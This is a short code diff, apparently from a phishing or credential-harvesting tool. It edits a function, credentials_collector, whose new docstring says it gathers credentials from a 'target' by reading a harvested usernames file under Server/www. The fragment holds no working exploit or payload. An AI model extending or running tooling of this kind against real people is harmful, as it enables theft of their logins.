@@ -103,8 +103,8 @@ def module_loading_message():  # This one just show text..
     print(localization.lang_module_loading_message["select_any_mode"])
 
 
-def credentials_collector(port):
-
+def credentials_collector():
+    """Collects, writes and returns credentials and additional info gathered from target."""
     print(localization.lang_credentials_collector["waiting_for_interaction"])
     while True:
         with open('Server/www/usernames.txt') as creds:
